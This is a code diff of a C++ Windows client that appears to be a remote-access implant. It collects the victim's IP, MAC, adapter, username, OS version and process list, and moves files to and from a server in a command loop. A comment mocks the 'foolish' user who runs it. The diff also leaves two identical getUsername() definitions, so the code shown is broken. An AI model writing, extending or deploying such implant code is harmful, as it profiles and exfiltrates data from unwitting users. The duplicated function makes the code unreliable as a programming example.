@@ -39,7 +39,7 @@ void xor_func(char * data, int len) {
 	}
 }
 
-std::string getNetworkInfo() {
+std::string getAdapterInfo() {
 	std::string nwInfo;
 	PIP_ADAPTER_INFO pAdapterInfo;
 	PIP_ADAPTER_INFO pAdapter = NULL;
@@ -72,12 +72,29 @@ std::string getNetworkInfo() {
 	return nwInfo;
 }
 
+// get the username of the user foolish enough to run this godforsaken program
 std::string getUsername() {
-	char userbuf[512];
-	int length;
-	GetUserNameA(userbuf, (LPDWORD)&length);
-	std::string pname(userbuf);
-	return pname;
+	char buffer[512];
+	int UNLength;
+	GetUserNameA(buffer, (LPDWORD)&UNLength);
+	std::string uname(buffer);
+	return uname; // return username
+}
+
+std::string getUsername() {
+    DWORD bufferSize = 0;
+    GetUserNameA(NULL, &bufferSize);
+    if (bufferSize == 0) {
+        return ""; // If username space is 0 return emptystring
+    }
+    char* buffer = new char[bufferSize];
+    if (GetUserNameA(buffer, &bufferSize)) {
+        std::string username(buffer);
+        delete[] buffer;
+        return username;
+    }
+    delete[] buffer;
+    return "";
 }
 
 std::string getMACs() {
@@ -154,8 +171,8 @@ std::string get_response_string(HANDLE hReq) {
 	return nullptr;
 }
 
+// get the windows os version
 std::string getWinVer() {
-    // Get the version information of the current operating system
     OSVERSIONINFOEX osvi;
     ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
     osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
@@ -222,25 +239,27 @@ std::string getWinVer() {
 
 //use previous functions in information string.
 std::string getSysInfo() {
-	return "PUBLIC IP:\n" + getPublicIP() + "\n" + "MAC Addresses:\n" + getMACs() + "\n" + "NETWORK INFO:\n" + getNetworkInfo() + "\n" + "USERNAME:\n" + getUsername() + "\n" + "WINDOWS VERSION:\n" + getWinVer();
+	return  "NETWORK ADAPTER INFO:\n" + getAdapterInfo() + "\n\n" +
+			"PUBLIC IP:\n" + getPublicIP() + "\n\n" +
+			"MAC Addresses:\n" + getMACs() +"\n\n" + 
+			"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
+			"USERNAME:\n" + getUsername();
 }
 
 //get data from process and turn it into human readable/understandable information
-std::string getProcToStr() {
+std::string getProc() {
 	std::string proclst;
 	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32 procEntry;
 	procEntry.dwSize = sizeof(PROCESSENTRY32);
 	Process32First(hTH32, &procEntry);
-	do
-	{
+	do {
 		std::wstring wpname(procEntry.szExeFile);
 		std::string pname(wpname.begin(), wpname.end());
 		proclst += pname;
 		proclst += ":";
 		char buf[UNLEN + 1];
 		DWORD len = UNLEN + 1;
-		// 10 is for base 10
 		_itoa_s(procEntry.th32ProcessID, buf, 10);
 		buf[UNLEN] = 0;
 		proclst += buf;
@@ -251,8 +270,6 @@ std::string getProcToStr() {
 
 // Client uploads to server.
 void handle_upload(SOCKET csocket, char * path) {
-// L
-
 	int filesize = 0;
 	int total_read = 0;
 	char buf[1024] = {0};
@@ -282,7 +299,6 @@ void handle_upload(SOCKET csocket, char * path) {
 
 // Client handles download from server.
 void handle_download(SOCKET csocket, char * path) {
-// L
 	int filesize = 0;
 	int total_read = 0;
 	char buf[1024] = {0};
@@ -381,7 +397,6 @@ int main(int argc, char const* argv[]) {
 	puts("Connection to server successful");
 
 	while(true) {
-
 		std::string procs;
 		int length;
 		char* thing;
@@ -428,7 +443,7 @@ int main(int argc, char const* argv[]) {
 				break;
 			case 2:
 				puts("processes");
-				procs = getProcToStr();
+				procs = getProc();
 				length = procs.length();
 				thing = (char *) malloc(length);
 
